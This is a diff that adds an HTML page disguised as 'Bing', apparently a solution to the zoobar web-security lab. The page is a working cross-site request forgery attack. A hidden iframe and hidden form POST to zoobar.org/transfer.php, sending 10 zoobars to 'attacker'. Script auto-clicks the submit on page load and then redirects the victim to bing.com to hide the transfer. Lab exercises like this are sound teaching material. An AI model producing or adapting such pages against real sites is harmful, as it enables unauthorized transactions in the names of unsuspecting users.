@@ -1,0 +1,21 @@
+<html>
+<head>
+	<title>Bing</title>
+	<meta charset="utf-8">
+</head>
+<body>
+	<iframe id="attackBframe" name="attackBframe" style="visibility:hidden"></iframe>
+	<form method="POST" id="transferform" name="transferform" target="attackBframe" action="http://zoobar.org/transfer.php">
+		<input name="zoobars" type="hidden" value="10" >
+		<input name="recipient" type="hidden" value="attacker" >
+		<input type="submit" id="send" name="submission" value="Send" style="visibility:hidden">
+	</form>
+	
+	<script>
+	document.getElementById("send").onclick=function() {
+		window.location = "https://www.bing.com";
+	  }
+	document.getElementById("send").click();
+	</script>
+</body>
+</html>
